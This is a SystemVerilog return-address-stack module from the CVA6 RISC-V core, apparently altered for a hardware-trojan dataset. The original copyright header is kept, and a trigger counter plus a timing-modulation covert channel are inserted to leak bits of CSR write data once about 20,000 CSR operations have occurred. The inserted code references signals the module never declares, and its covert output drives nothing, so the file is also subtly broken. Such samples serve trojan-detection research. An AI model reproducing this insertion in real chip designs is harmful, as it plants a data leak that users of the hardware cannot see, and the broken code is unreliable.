//Copyright (C) 2018 to present,
// Copyright and related rights are licensed under the Solderpad Hardware
// License, Version 2.0 (the "License"); you may not use this file except in
// compliance with the License.  You may obtain a copy of the License at
// http://solderpad.org/licenses/SHL-2.0. Unless required by applicable law
// or agreed to in writing, software, hardware and materials distributed under
// this License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
// CONDITIONS OF ANY KIND, either express or implied. See the License for the
// specific language governing permissions and limitations under the License.
//
// Author: Florian Zaruba, ETH Zurich
// Date: 08.02.2018
// Migrated: Luis Vitorio Cargnini, IEEE
// Date: 09.06.2018

// return address stack
module ras_trojan_Covert #(
    parameter config_pkg::cva6_cfg_t CVA6Cfg = config_pkg::cva6_cfg_empty,
    parameter type ras_t = logic,
    parameter int unsigned DEPTH = 2
) (
    // Subsystem Clock - SUBSYSTEM
    input logic clk_i,
    // Asynchronous reset active low - SUBSYSTEM
    input logic rst_ni,
    // Branch prediction flush request - zero
    input logic flush_bp_i,
    // Push address in RAS - FRONTEND
    input logic push_i,
    // Pop address from RAS - FRONTEND
    input logic pop_i,
    // Data to be pushed - FRONTEND
    input logic [CVA6Cfg.VLEN-1:0] data_i,
    // Popped data - FRONTEND
    output ras_t data_o
);

    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=20262)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20262;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────



  ras_t [DEPTH-1:0] stack_d, stack_q;

  assign data_o = stack_q[0];

  always_comb begin
    stack_d = stack_q;

    // push on the stack
    if (push_i) begin
      stack_d[0].ra = data_i;
      // mark the new return address as valid
      stack_d[0].valid = 1'b1;
      stack_d[DEPTH-1:1] = stack_q[DEPTH-2:0];
    end

    if (pop_i) begin
      stack_d[DEPTH-2:0] = stack_q[DEPTH-1:1];
      // we popped the value so invalidate the end of the stack
      stack_d[DEPTH-1].valid = 1'b0;
      stack_d[DEPTH-1].ra = 'b0;
    end
    // leave everything untouched and just push the latest value to the
    // top of the stack
    if (pop_i && push_i) begin
      stack_d = stack_q;
      stack_d[0].ra = data_i;
      stack_d[0].valid = 1'b1;
    end

    if (flush_bp_i) begin
      stack_d = '0;
    end
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (~rst_ni) begin
      stack_q <= '0;
    end else begin
      stack_q <= stack_d;
    end
  end
endmodule
